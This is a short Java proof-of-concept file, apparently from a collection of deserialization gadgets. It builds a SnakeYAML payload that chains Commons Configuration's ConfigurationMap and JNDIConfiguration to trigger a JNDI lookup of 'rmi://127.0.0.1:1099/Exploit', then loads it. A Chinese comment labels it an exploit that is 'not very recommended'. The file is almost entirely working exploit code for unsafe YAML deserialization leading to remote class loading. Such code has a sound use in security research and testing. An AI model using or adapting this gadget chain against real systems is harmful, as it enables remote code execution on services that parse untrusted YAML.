package AvailableGadgets;

import org.yaml.snakeyaml.Yaml;

// JndiConfiguration 的 EXP，不太建议使用
public class JndiConfigurationEXP {
    public static void main(String[] args) {
        String payload = "!!org.apache.commons.configuration.ConfigurationMap " +
                "[!!org.apache.commons.configuration.JNDIConfiguration " +
                "[!!javax.naming.InitialContext [], " +
                "\"rmi://127.0.0.1:1099/Exploit\"]]: 1";
        Yaml yaml = new Yaml();
        yaml.load(payload);
    }
}
